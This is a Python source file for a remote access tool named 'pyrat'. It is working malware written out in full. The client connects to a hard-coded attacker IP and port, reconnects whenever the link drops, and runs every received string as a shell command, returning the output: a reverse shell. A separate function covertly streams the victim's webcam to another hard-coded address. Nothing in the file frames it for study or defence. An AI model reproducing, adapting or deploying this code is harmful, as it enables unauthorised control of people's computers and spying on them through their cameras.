#                             __
#     ____  __  ___________ _/ /_
#    / __ \/ / / / ___/ __ `/ __/
#   / /_/ / /_/ / /  / /_/ / /_
#  / .___/\__, /_/   \__,_/\__/
# /_/    /____/
#
# Python remote access tool
# Development commenced on 22 November 2018
# Created by BigBanana (Discord: BigBanana#0001)
#
# Import needed modules
import sys
import socket
import subprocess
import time
##import cv2
import _pickle
import os

# Beginning of main ----------------------------------------------------------------------------------------------------
def main():
    # Specify attacker's ip as HOST and a port to communicate through, instantiate socket
    def createSocket():
        try:
            global HOST
            global PORT
            global sock
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            HOST = ('138.197.100.100')
            PORT = 4200
        except socket.error as msg:
            print("Error creating socket: " + str(msg))

    # Try to connect to attacker
    def connect():
        try:
            global HOST
            global PORT
            global sock
            sock.connect((HOST, int(PORT)))
        except socket.error as msg:
            print("Error connecting socket: " + str(msg))
            time.sleep(3)
            connect()

    # Reconnect if need be.
    def reconnect():
        try:
            global sock
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            receive_commands()
        except socket.error as msg:
            print("Error restarting the connection: " + str(msg))
            print('Restarting...')
            reconnect()

    # replaced all utf-8 with cp1252
    def receive_commands():
        global sock, HOST, PORT
        while True:
            data = sock.recv(1024)
            if data[:2].decode("cp1252") == 'cd':
                os.chdir(data[3:].decode("cp1252"))
            elif data[:].decode("cp1252") == "webcam":
                sock.close()
                webcamsender()
                break
            elif data[:].decode("cp1252") == "free":
                print("freed")
                sock.close()
                sys.exit()
                break
            elif data[:].decode("cp1252") == "help" or data[:].decode("cp1252") == "Help":
                print("")
            elif len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("cp1252"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "cp1252")
                sock.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
            reconnect()

    createSocket()
    connect()
    receive_commands()
# END OF MAIN ----------------------------------------------------------------------------------------------------------

# Webcam streamer ------------------------------------------------------------------------------------------------------
###
def webcamsender():
    cap = cv2.VideoCapture(0)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('96.241.51.88', 4200))
    cap.set(3, 640)
    cap.set(4, 360)
    cap.set(5, 60)
    cap.set(15, -4)

    while cap.isOpened():
        try:
            ret, frame = cap.read()
            if ret:
                encode = _pickle.dumps(cv2.imencode('.jpg', frame)[1])
                s.sendall(encode)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    s.close()
                    break
        except socket.error as msg:
            cap.release()
            cv2.destroyAllWindows()
            main()
            break
###
# End of webcam streamer -----------------------------------------------------------------------------------------------

if __name__ == '__main__':
    main()